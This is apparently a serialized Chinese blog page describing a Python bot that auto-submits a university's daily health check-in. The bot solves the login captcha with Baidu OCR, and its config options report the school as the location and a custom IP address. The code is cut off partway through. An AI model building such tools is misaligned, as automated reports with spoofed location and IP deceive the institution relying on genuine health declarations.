data-src=\"https://cdn.file.todest.cn/blog/pic/20201205171840.png\" alt=\"\"><br>最后，也可以前往<a href=\"https://ehall.hpu.edu.cn/taskcenter/workflow/done\">学校官网</a>查看打卡情况。</p>\n<h2 id=\"邮件通知\"><a href=\"#邮件通知\" class=\"headerlink\" title=\"邮件通知\"></a>邮件通知</h2><p>一般来说，以目前最新的代码，如果构建失败则打卡失败，所以添加构建失败后邮件提醒还是很有必要的。<br>如果想要构建失败后邮件通知的话，需要在个人账户设置-&gt;提醒设置里面开启持续集成（构建）邮件提醒。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201207181947.png\" alt=\"\"><br>并且需要在个人账户设置-&gt;邮箱设置添加想要接收邮件的邮箱并验证邮箱。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201207182447.png\" alt=\"\"><br>同时，在构建计划设置-&gt;通知提醒里面添加成员为自己并修改通知事件为仅失败。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201207182104.png\" alt=\"\"></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":11797,"excerpt":"<p>自动健康打卡(逃</p>\n<p>建议使用Coding定时构建，强烈不推荐使用国外服务器，包括github action。<br><strong>因当天打卡系统异常造成无法打卡时，需等待打卡系统正常后自行打卡或手动触发构建计划。</strong></p>\n<p><strong>本文档以及代码可能会不定时更新，修复和优化，部署成功的能不能在下面留言告诉一下，且留意本文章是否更新，最后更新时间可以看最上方。</strong><br>","more":"</p>\n<h1 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h1><p>注意将config.ini配置项进行修改，申请AK和SK教程见后文。<br><figure class=\"highlight ini\"><figcaption><span>config.ini</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Basic]</span></span><br><span class=\"line\"><span class=\"comment\">;是否更改健康打卡地址为学校</span></span><br><span class=\"line\"><span class=\"attr\">CHANGE_DATA</span> = <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">;是否修改IP地址</span></span><br><span class=\"line\"><span class=\"attr\">CHANGE_ADDR</span> = <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">;自定义IP地址</span></span><br><span class=\"line\"><span class=\"attr\">IP_ADDR</span> = <span class=\"number\">223.90</span>.<span class=\"number\">40.4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[API]</span></span><br><span class=\"line\"><span class=\"comment\">;百度智能云 文字识别OCR AK</span></span><br><span class=\"line\"><span class=\"attr\">API_KEY</span> = your_api_key</span><br><span class=\"line\"><span class=\"comment\">;百度智能云 文字识别OCR SK</span></span><br><span class=\"line\"><span class=\"attr\">SECRET_KEY</span> = your_secret_key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[User]</span></span><br><span class=\"line\"><span class=\"comment\">;昵称: [&#x27;账号&#x27;, &#x27;密码&#x27;]</span></span><br><span class=\"line\">sample_user: [&#x27;username&#x27;, &#x27;password&#x27;]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br>添加用户信息，账号密码为<a href=\"https://uia.hpu.edu.cn\">统一认证</a>账号密码。<br>如需多用户，可在<code>[User]</code>下按示例添加新行，注意都为英文符号，昵称随便起，可以为中文。</p>\n<p>上述AK以及SK需前往<a href=\"https://console.bce.baidu.com/ai/#/ai/ocr/app/list\">百度智能云</a>申请文字识别OCR API。<br>点击创建应用，依次填写应用名称，文字识别包名为不需要，应用归属为个人，应用描述后，点击立即创建，返回应用列表，即可得到API Key和Secret Key。</p>\n<h1 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h1><p>以下是完整代码main.py，无需更改，按之后步骤要求进行上传。</p>\n<figure class=\"highlight py\"><figcaption><span>main.py</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;自动健康打卡&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> absolute_import</span><br><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> configparser</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> retrying <span class=\"keyword\">import</span> retry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 固定链接，不建议修改</span></span><br><span class=\"line\">URL_MAP = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;HOST&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;START&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/start&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;ALIVE&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/alive&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;CAPTCHA&#x27;</span>: <span class=\"string\">&#x27;https://uia.hpu.edu.cn/sso/apis/v2/open/captcha?date=&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;LOGIN&#x27;</span>: <span class=\"string\">&#x27;https://uia.hpu.edu.cn/cas/login&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;RENDER&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/render&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;PROCESS&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/instance/[id]/progress&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;NEXTSTEP&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/listNextStepsUsers&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;DOACTION&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/doAction&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;CHECK&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/taskcenter/api/me/processes/done?limit=1&amp;start=0&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;API&#x27;</span>: <span class=\"string\">&#x27;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=[ak]&amp;client_secret=[sk]&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;REQUEST_URL&#x27;</span>: <span class=\"string\">&#x27;https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 请求头，可以按需更改</span></span><br><span class=\"line\">HEADERS = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;Chrome/78.0.3904.108 Safari/537.36 QIHU 360EE&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ReadConfig</span>:</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;读取配置文件类&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, filename</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;配置文件读取初始化&quot;&quot;&quot;</span></span><br><span class=\"line\">        self.config = configparser.ConfigParser()</span><br><span class=\"line\">        self.config[<span class=\"string\">&#x27;Basic&#x27;</span>] = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;CHANGE_DATA&#x27;</span>: <span class=\"literal\">True</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;CHANGE_ADDR&#x27;</span>: <span class=\"literal\">True</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;IP_ADDR&#x27;</span>: <span class=\"string\">&#x27;223.90.40.4&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        self.config.read(filename, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_basic</span>(<span class=\"params\">self, param</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;获取Basic配置&quot;&quot;&quot;</span></span><br><span class=\"line\">        value = self.config.get(<span class=\"string\">&#x27;Basic&#x27;</span>, param)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_api</span>(<span class=\"params\">self, param</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;获取API配置&quot;&quot;&quot;</span></span><br><span class=\"line\">        value = self.config.get(<span class=\"string\">&#x27;API&#x27;</span>, param)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_user</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;获取User配置&quot;&quot;&quot;</span></span><br><span class=\"line\">        value = self.config.items(<span class=\"string\">&#x27;User&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Bot</span>:</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;自动健康打卡类&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, config_file</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;打卡初始化&quot;&quot;&quot;</span></span><br><span class=\"line\">        logging.basicConfig(level=logging.INFO, format=<span class=\"string\">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class=\"line\">        self.logger = logging.getLogger(<span class=\"string\">&#x27;AutoReport&#x27;</span>)</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;程序启动中...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 读取配置文件</span></span><br><span class=\"line\">        self.data = ReadConfig(config_file)</span><br><span class=\"line\">        self.chdata = self.data.get_basic(<span class=\"string\">&#x27;CHANGE_DATA&#x27;</span>)</span><br><span class=\"line\">        self.chaddr = self.data.get_basic(<span class=\"string\">&#x27;CHANGE_ADDR&#x27;</span>)</span><br><span class=\"line\">        self.ipaddr = self.data.get_basic(<span class=\"string\">&#x27;IP_ADDR&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.api_key = self.data.get_api(<span class=\"string\">&#x27;API_KEY&#x27;</span>)</span><br><span class=\"line\">        self.secret_key = self.data.get_api(<span class=\"string\">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 登录并打卡</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> user <span class=\"keyword\">in</span> self.data.get_user():</span><br><span class=\"line\">            self.sessions = requests.session()</span><br><span class=\"line\">            self.login(user)</span><br><span class=\"line\">            self.post()</span><br><span class=\"line\">            self.sessions.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @retry(stop_max_attempt_number=3)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">self, user</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;登录&quot;&quot;&quot;</span></span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;%s开始登录中...&#x27;</span>, user[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 登录页面</span></span><br><span class=\"line\">        req = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>], headers=HEADERS)</span><br><span class=\"line\">        req = self.sessions.get(req.url, headers=HEADERS)</span><br><span class=\"line\">        soup = BeautifulSoup(req.content, features=<span class=\"string\">&quot;html.parser&quot;</span>)</span><br><span class=\"line\">        form = soup.find_all(<span class=\"string\">&#x27;input&#x27;</span>, class_=<span class=\"string\">&#x27;for-form&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 验证码获取</span></span><br><span class=\"line\">        captcha = URL_MAP[<span class=\"string\">&#x27;CAPTCHA&#x27;</span>] + str(int(round(time.time() * <span class=\"number\">1000</span>)))</span><br><span class=\"line\">        req = self.sessions.get(captcha, headers=HEADERS)</span><br><span class=\"line\">        img = ast.literal_eval(req.content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))[<span class=\"string\">&#x27;img&#x27;</span>]</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;验证码获取成功!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 验证码识别</span></span><br><span class=\"line\">        api = URL_MAP[<span class=\"string\">&#x27;API&#x27;</span>].replace(<span 